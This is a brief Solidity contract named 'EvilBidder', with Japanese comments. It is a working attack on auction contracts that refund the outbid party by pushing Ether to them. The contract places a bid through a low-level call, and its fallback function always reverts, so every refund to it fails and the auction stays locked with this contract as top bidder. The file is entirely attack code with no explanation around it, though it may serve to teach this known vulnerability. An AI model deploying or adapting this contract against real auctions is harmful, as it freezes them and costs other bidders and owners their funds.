pragma solidity ^0.4.11;
contract  EvilBidder {
	/// Fallback関数
	function() payable{
		revert();
	}
		
	/// bid用の関数
	function bid(address _to) public payable {
		// bidを行う
		if(!_to.call.value(msg.value)(bytes4(sha3("bid()")))) {
			throw;
		} 
	}
}
